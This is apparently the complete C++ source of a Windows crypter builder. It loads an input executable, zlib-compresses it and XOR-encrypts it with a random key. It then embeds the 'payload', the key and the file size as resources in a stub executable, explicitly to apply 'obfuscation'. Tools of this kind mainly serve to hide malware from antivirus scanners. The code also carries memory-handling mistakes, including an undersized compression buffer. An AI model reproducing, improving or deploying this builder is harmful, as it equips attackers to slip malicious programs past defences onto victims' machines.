#include <stdio.h>
#include <stdarg.h>
#include <windows.h>
#include <wincrypt.h>
#include <zlib.h>
#include <iostream>

#include "resource.h"

#define BUFFER_RSRC_ID 10
#define FILE_SIZE_RSRC_ID 20
#define KEY_RSRC_ID 30

#define KEY_LEN 64

typedef struct _FileStruct
{
	PBYTE pBuffer;
	DWORD dwBufSize;
	DWORD dwFileSize;
	PBYTE pKey;
} FileStruct;

FileStruct* LoadFile(LPCSTR szFileName)
{
	std::cout << std::endl << "Loading " << szFileName << "...";

	std::cout << std::endl << "Initializing struct...";

	FileStruct* fs = (FileStruct*)malloc(sizeof(FileStruct));

	if (fs == NULL)
	{
		std::cout << std::endl << "Create " << szFileName << "file structure error: " << GetLastError();
		return NULL;
	}

	std::cout << std::endl << "Initializing file...";

	HANDLE hFile = CreateFileA(szFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		std::cout << std::endl << "Create file error: " << GetLastError();
		free(fs);
		return NULL;
	}

	std::cout << std::endl << "Retrieving file size...";

	fs->dwFileSize = GetFileSize(hFile, NULL);
	if (fs->dwFileSize == INVALID_FILE_SIZE)
	{
		std::cout << std::endl << "Get file size error: " << GetLastError();
		free(fs);
		return NULL;
	}

	fs->dwBufSize = fs->dwFileSize;

	fs->pBuffer = (PBYTE)malloc(fs->dwFileSize);
	if (fs->pBuffer == NULL)
	{
		std::cout << std::endl << "Create buffer error: " << GetLastError();
		CloseHandle(hFile);
		free(fs);
		return NULL;
	}

	std::cout << std::endl << "Reading file contents...";
	DWORD dwRead = 0;
	if (ReadFile(hFile, fs->pBuffer, fs->dwFileSize, &dwRead, NULL) == FALSE)
	{
		std::cout << std::endl << "Read file error: " << GetLastError();
		CloseHandle(hFile);
		free(fs->pBuffer);
		free(fs);
		return NULL;
	}

	std::cout << std::endl << "Read " << dwRead << " bytes";
	CloseHandle(hFile);

	return fs;
}

BOOL UpdateStub(LPCSTR szFileName, FileStruct* fs)
{
	HANDLE hUpdate = BeginUpdateResource(szFileName, FALSE);

	if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(BUFFER_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs->pBuffer, fs->dwBufSize) == FALSE)
	{
		std::cout << std::endl << "Update resource error: " << GetLastError();
		return FALSE;
	}

	if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(FILE_SIZE_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), (PVOID)& fs->dwFileSize, sizeof(DWORD)) == FALSE)
	{
		std::cout << std::endl << "Update resource error: " << GetLastError();
		return FALSE;
	}

	if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(KEY_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs->pKey, KEY_LEN) == FALSE)
	{
		std::cout << std::endl << "Update resource error: " << GetLastError();
		return FALSE;
	}

	EndUpdateResource(hUpdate, FALSE);
	return TRUE;
}

BOOL BuildStub(LPCSTR szFileName, FileStruct* fs)
{
	std::cout << std::endl << std::endl << "Building stub: " << szFileName;

	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(1), "STUB");
	if (hRsrc == NULL)
	{
		std::cout << std::endl << "Find stub resource error: " << GetLastError();
		return FALSE;
	}

	DWORD dwSize = SizeofResource(NULL, hRsrc);

	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL)
	{
		std::cout << std::endl << "Load stub resource error: " << GetLastError();
		return FALSE;
	}

	PBYTE pBuffer = (PBYTE)LockResource(hGlobal);
	if (pBuffer == NULL)
	{
		std::cout << "Lock stub resource error: " << GetLastError();
		return FALSE;
	}

	std::cout << std::endl << "Creating stub...";
	HANDLE hFile = CreateFileA(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		std::cout << std::endl << "Create stub error: " << GetLastError();
		free(pBuffer);
		return FALSE;
	}

	std::cout << std::endl << "Writing payload to stub...";

	DWORD dwWritten = 0;
	if (WriteFile(hFile, pBuffer, dwSize, &dwWritten, NULL) == FALSE)
	{
		std::cout << std::endl << "Write payload to stub error: " << GetLastError();
		CloseHandle(hFile);
		free(pBuffer);
		return FALSE;
	}

	std::cout << std::endl << "Wrote " << dwWritten << " bytes";

	CloseHandle(hFile);

	std::cout << std::endl << "Updating stub with payload...";
	if (UpdateStub(szFileName, fs) == FALSE)
		return FALSE;

	return TRUE;
}

BOOL GenerateKey(FileStruct* fs)
{
	fs->pKey = (PBYTE)malloc(KEY_LEN);
	if (fs->pKey == NULL)
		return FALSE;

	HCRYPTPROV hProv = NULL;
	if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT) == FALSE)
	{
		std::cout << std::endl << "Crypt acquire context error: " << GetLastError();
		free(fs->pKey);
		return FALSE;
	}

	std::cout << std::endl << "Generating cryptographically secure bytes...";
	if (CryptGenRandom(hProv, KEY_LEN, fs->pKey) == FALSE)
	{
		std::cout << std::endl << "Generate random key error: " << GetLastError();
		free(fs->pKey);
		return FALSE;
	}

	std::cout << std::endl << std::endl << "Using key: ";
	for (int i = 0; i < KEY_LEN; i++)
	{
		std::cout << std::hex << fs->pKey[i];
	}

	CryptReleaseContext(hProv, 0);

	return TRUE;
}

BOOL EncryptPayload(FileStruct* fs)
{
	std::cout << std::endl << "Encrypting payload ....";

	std::cout << std::endl << "Generating key...";
	if (GenerateKey(fs) == FALSE)
		return FALSE;

	for (DWORD i = 0; i < fs->dwBufSize; i++)
	{
		fs->pBuffer[i] ^= fs->pKey[i % KEY_LEN];
	}
	std::cout << std::endl;
	std::cout << std::endl << "EncryptPayload routine complete.";
	return TRUE;
}

BOOL CompressPayload(FileStruct* fs)
{
	std::cout << std::endl << "Compressing payload...";

	PBYTE pCompressedBuffer = (PBYTE)malloc(fs->dwBufSize);
	ULONG ulCompressedBufferSize = compressBound((ULONG)fs->dwBufSize);
	compress(pCompressedBuffer, &ulCompressedBufferSize, fs->pBuffer, fs->dwBufSize);

	fs->pBuffer = pCompressedBuffer;
	fs->dwBufSize = ulCompressedBufferSize;

	std::cout << std::endl << "Compression routine complete.";

	return TRUE;
}

int main(int argc, char* argv[])
{
	if (argc < 3)
	{
		std::cout << std::endl << "Usage " << argv[0] << "[INPUT FILE] [OUTPUT FILE]";
		return 1;
	}

	FileStruct* fs = LoadFile(argv[1]);
	if (fs == NULL)
		return 1;

	std::cout << std::endl << std::endl << "Applying obfuscation...";
	if (CompressPayload(fs) == FALSE)
	{
		free(fs);
		return 1;
	}

	if (EncryptPayload(fs) == FALSE)
	{
		free(fs);
		return 1;
	}

	if (BuildStub(argv[2], fs) == FALSE)
	{
		free(fs->pKey);
		free(fs);
		return 1;
	}

	free(fs->pKey);
	free(fs);

	std::cout << std::endl << "Done.";

	std::cout << std::endl << std::endl;
	return 0;
}